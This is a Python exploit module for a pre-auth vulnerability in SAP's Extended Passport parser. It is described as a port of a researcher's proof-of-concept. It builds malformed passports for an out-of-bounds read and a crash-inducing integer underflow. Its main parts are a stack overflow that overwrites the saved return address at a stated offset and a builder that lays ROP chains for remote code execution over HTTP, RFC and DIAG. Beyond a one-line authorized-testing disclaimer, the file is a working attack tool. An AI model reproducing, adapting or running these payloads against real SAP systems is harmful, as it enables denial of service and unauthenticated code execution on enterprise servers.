"""sap_epp — SAP Extended Passport (EPP) wire-format builder.

The Extended Passport is SAP's request-tracing payload carried across
DIAG, RFC, and HTTP requests (`sap-passport` header).  Its parser
(`eppDeserialize` in the SAP kernel) is where CVE-2026-44756 lives —
three bugs (A/B/C) reachable pre-auth on all three channels, of which
bug C is a stack overflow → saved-RIP control → remote code execution.

This file is a de-vendored port of Julian Petersohn's `epp.py` from the
CVE-2026-44756 research package.  All wire offsets and the
UTF-8/UTF-16 transcode invariants are Julian's — verified against SAP
NetWeaver RFC SDK 7.50 PL18 (vulnerable) vs PL19 (fixed) and against
the kernel's `icman` / `disp+work` binaries.

Public API:
    MAGIC, CORE_LEN, VP_HDR_LEN, IT_HDR_LEN, RIP_OFFSET_BYTES
    Passport() — build a valid passport, add var-part items, .build()
                 → raw bytes, .to_header() → uppercase hex for HTTP
    valid()             — well-formed passport, non-destructive probe
    valid_with_item()   — well-formed + one type-3 item, non-destructive
    bug_a(offset=…)     — malformed varPartOffset (negative, OOB read)
    bug_b()             — itemLen underflow (< 7-byte header)
    bug_c(target_rip)   — type-4 stack overflow, hijacks saved RIP
    build_rop(chain, …) — multi-item null-placement ROP builder

Credit:
    Julian Petersohn (randomstr1ng) — full RE, PL18/PL19 binary diff,
    wire-format documentation.  Original file: `poc/epp.py` in
    CVE-2026-44756 research package (private).

For authorized security testing only.
"""
from __future__ import annotations

import struct


MAGIC = b"\x2a\x54\x48\x2a"  # "*TH*"

# --- Core-part offsets ------------------------------------------------------
OFF_MAGIC          = 0x00
OFF_VERSION        = 0x04
OFF_TOTALLEN       = 0x05
OFF_TRACEFLAGS     = 0x07
OFF_COMPONENTNAME  = 0x09
OFF_SERVICE        = 0x29
OFF_USERID         = 0x2B
OFF_ACTION         = 0x4B
OFF_ACTIONTYPE     = 0x73
OFF_PREVCOMPONENT  = 0x75
OFF_TRANSACTIONID  = 0x95
OFF_CLIENT         = 0xB5
OFF_COMPONENTTYPE  = 0xB8
OFF_ROOTCONTEXTID  = 0xBA
OFF_CONNECTIONID   = 0xCA
OFF_CONNCOUNTER    = 0xDA
OFF_VARPARTCOUNT   = 0xDE
OFF_VARPARTOFFSET  = 0xE0
CORE_LEN           = 0xE2

VP_HDR_LEN         = 0x0C
IT_HDR_LEN         = 0x07

# Distance from the Utf8sToUcs destination (rbp-0x430) to the saved return
# address (rbp+8) in eppDeserialize.  Identical in the RFC SDK, icman, and
# disp+work.  540 UTF-16 units of filler, then 3 units for the low 48 bits
# of the target RIP, then 0x0000 supplied by the converter's terminator.
RIP_OFFSET_BYTES   = 0x438
RIP_OFFSET_UNITS   = RIP_OFFSET_BYTES // 2   # 540


def utf8_unit(unit: int) -> bytes:
    """Encode a single UTF-16 code unit so the SAP UTF-8→UCS converter
    reproduces it verbatim in the output buffer.

    Two units cannot be produced by the converter and must be rejected
    before they land in a passport payload:
        U+0000     — terminates the source string; the overlong C0 80
                     form is also rejected by the kernel's `cmp ecx,0xc2`.
        U+D800…U+DFFF — surrogate range; the converter substitutes
                     `rscpReplacementCharacter` instead of preserving.
    """
    if unit == 0:
        raise ValueError("U+0000 cannot be produced by the converter")
    if 0xD800 <= unit <= 0xDFFF:
        raise ValueError(f"surrogate {unit:#06x} is substituted, not preserved")
    return chr(unit).encode("utf-8")


def units_for_address(addr: int) -> list[int]:
    """Split a 64-bit userspace address into the three low UTF-16 units
    that the passport payload needs to embed.

    The fourth (top) unit is 0x0000 for any canonical userspace address
    and is supplied for free by the NUL terminator the converter
    appends — this is the "one magic pointer" invariant Julian discovered.
    """
    if addr >> 48:
        raise ValueError(f"address {addr:#x} has a non-zero top unit")
    return [(addr >> 0) & 0xFFFF,
            (addr >> 16) & 0xFFFF,
            (addr >> 32) & 0xFFFF]


class Passport:
    """Extended Passport wire-format builder.

    Usage:
        p = Passport()
        p.varpart_begin()
        p.item(key=1, word2=0, it_type=4, data=...)
        p.varpart_end()
        wire_bytes = p.build()
        http_hex   = p.to_header()
    """

    def __init__(self, version: int = 3):
        self.core = bytearray(CORE_LEN)
        self.core[OFF_MAGIC:OFF_MAGIC + 4] = MAGIC
        self.core[OFF_VERSION] = version
        self._set(OFF_COMPONENTNAME,  b"HARNESS",           32)
        self._set(OFF_USERID,         b"TESTUSER",          32)
        self._set(OFF_ACTION,         b"TEST",              40)
        self._set(OFF_PREVCOMPONENT,  b"PREV",              32)
        self._set(OFF_TRANSACTIONID,  b"0123456789ABCDEF",  32)
        self._set(OFF_CLIENT,         b"001",                3)
        struct.pack_into(">H", self.core, OFF_SERVICE,       1)
        struct.pack_into(">H", self.core, OFF_ACTIONTYPE,    1)
        struct.pack_into(">H", self.core, OFF_COMPONENTTYPE, 1)
        struct.pack_into(">I", self.core, OFF_CONNCOUNTER,   1)
        self.varparts = bytearray()
        self._vp_start = None

    def _set(self, off: int, value: bytes, size: int) -> None:
        self.core[off:off + size] = value.ljust(size, b"\x00")[:size]

    # -- variable parts and items ------------------------------------------

    def varpart_begin(self, vp_type: int = 0, vp_id: int = 1) -> int:
        self._vp_start = len(self.varparts)
        hdr = bytearray(VP_HDR_LEN)
        hdr[0:4] = MAGIC
        hdr[4]   = vp_type
        struct.pack_into(">H", hdr, 0x08, vp_id)
        struct.pack_into(">H", hdr, 0x0A, 0)
        self.varparts += hdr
        return self._vp_start

    def item(self, key: int, word2: int, it_type: int, data: bytes,
              item_len: int = None) -> None:
        if item_len is None:
            item_len = IT_HDR_LEN + len(data)
        hdr = bytearray(IT_HDR_LEN)
        struct.pack_into(">H", hdr, 0x00, key)
        struct.pack_into(">H", hdr, 0x02, word2)
        hdr[0x04] = it_type
        struct.pack_into(">H", hdr, 0x05, item_len & 0xFFFF)
        self.varparts += hdr + data
        vp = self._vp_start
        count = struct.unpack_from(">H", self.varparts, vp + 0x0A)[0]
        struct.pack_into(">H", self.varparts, vp + 0x0A, count + 1)

    def varpart_end(self) -> None:
        vp = self._vp_start
        struct.pack_into(">H", self.varparts, vp + 0x05,
                          (len(self.varparts) - vp) & 0xFFFF)

    # -- assembly ---------------------------------------------------------

    def build(self, varpart_count: int = None,
                varpart_offset: int = None) -> bytes:
        if varpart_count is None:
            varpart_count = 1 if self.varparts else 0
        if varpart_offset is None:
            varpart_offset = CORE_LEN if self.varparts else 0

        body = bytes(self.core) + bytes(self.varparts) + MAGIC
        out = bytearray(body)
        struct.pack_into(">H", out, OFF_TOTALLEN,     len(body))
        struct.pack_into(">H", out, OFF_VARPARTCOUNT, varpart_count)
        struct.pack_into(">H", out, OFF_VARPARTOFFSET,
                          varpart_offset & 0xFFFF)
        return bytes(out)

    def to_header(self, **kw) -> str:
        """Uppercase hex, as accepted by the HTTP `sap-passport` header."""
        return self.build(**kw).hex().upper()


# --- Ready-made cases ------------------------------------------------------

def valid() -> Passport:
    """Well-formed passport with no var-part items — non-destructive probe."""
    return Passport()


def valid_with_item() -> Passport:
    """Well-formed passport carrying a type-3 var-part item — still safe."""
    p = Passport()
    p.varpart_begin()
    p.item(1, 0, 3, b"ABCDEFGHIJKLMNOP")
    p.varpart_end()
    return p


def bug_a(offset: int = 0x8000) -> tuple:
    """Bug A: signed varPartOffset OOB read.

    Non-destructive.  Parser rejects the frame (or reflects the OOB
    read on the wire, which is the info-leak primitive Julian
    identified in §27), service stays up.
    """
    p = Passport()
    return p, {"varpart_count": 1, "varpart_offset": offset}


def bug_b() -> Passport:
    """Bug B: itemLen below the 7-byte header size → integer underflow → DoS.

    Kernel dies parsing the item.  Reachable pre-auth on all three
    channels (HTTP, RFC, DIAG).
    """
    p = Passport()
    p.varpart_begin()
    p.item(1, 0, 4, b"", item_len=0)
    p.varpart_end()
    return p


def bug_c(target_rip: int, filler_unit: int = 0x0041) -> Passport:
    """Bug C: type-4 item overflowing the eppDeserialize stack frame,
    hijacking the saved return address to `target_rip`.

    Payload layout:
        units 0 .. 539     filler_unit (default 'A' = 0x0041)
        units 540 .. 542   the three low UTF-16 units of target_rip
        unit  543          0x0000, supplied by the converter's terminator
                            — provides the top 16 bits of the address
                            for any canonical userspace pointer

    The 540 + 3 + 1 = 544 UTF-16 units = 1088 bytes, exactly reaching
    the saved RIP at rbp+8 from the destination buffer at rbp-0x430.
    """
    data = b"".join(utf8_unit(filler_unit) for _ in range(RIP_OFFSET_UNITS))
    for unit in units_for_address(target_rip):
        data += utf8_unit(unit)
    data += b"\x00"   # bounds the strlen the converter performs

    p = Passport()
    p.varpart_begin()
    p.item(1, 0, 4, data)
    p.varpart_end()
    return p


# --- ROP chain construction (multi-item null-placement, §12) ---------------

def build_rop(chain: list, filler_units: int = None,
                filler: int = 0x0041) -> Passport:
    """Build a passport whose type-4 overflow lays a ROP chain over the
    saved return address and the stack above it.

    `chain` is a list of 8-byte gadget/values.  chain[0] overwrites the
    saved return address (unit offset RIP_OFFSET_UNITS = 540); chain[k]
    follows at unit 540 + 4k.  Each gadget occupies three data units
    (its low 48 bits); its top unit (offset 543 + 4k) is forced to
    0x0000 by a dedicated item's terminator, using descending-length
    items so higher nulls are preserved.

    Every gadget must be a canonical userspace address (top 16 bits
    zero) whose lower three units avoid the surrogate range.
    """
    if filler_units is None:
        filler_units = RIP_OFFSET_UNITS   # 540

    n = len(chain)
    for g in chain:
        if g >> 48:
            raise ValueError(f"gadget {g:#x} has non-zero top unit")
        for u in units_for_address(g):
            if u == 0 or 0xD800 <= u <= 0xDFFF:
                raise ValueError(f"gadget {g:#x} has an unrepresentable unit {u:#06x}")

    def unit_at(idx: int) -> int:
        """The UTF-16 unit that belongs at absolute unit index idx."""
        if idx < filler_units:
            return filler
        rel = idx - filler_units
        k, sub = divmod(rel, 4)
        if k >= n:
            return filler
        if sub == 3:
            return filler   # gadget top unit → nulled by a terminator
        return units_for_address(chain[k])[sub]

    p = Passport()
    p.varpart_begin()
    # Descending items: item for k = n-1 .. 0, each terminating at unit
    # 543 + 4k so the higher-index terminators land first and are not
    # overwritten by the lower-index items' filler.
    for k in range(n - 1, -1, -1):
        term_unit = filler_units + 4 * k + 3
        data = b""
        for idx in range(term_unit):
            data += utf8_unit(unit_at(idx))
        data += b"\x00"
        p.item(1, 0, 4, data)
    p.varpart_end()
    return p
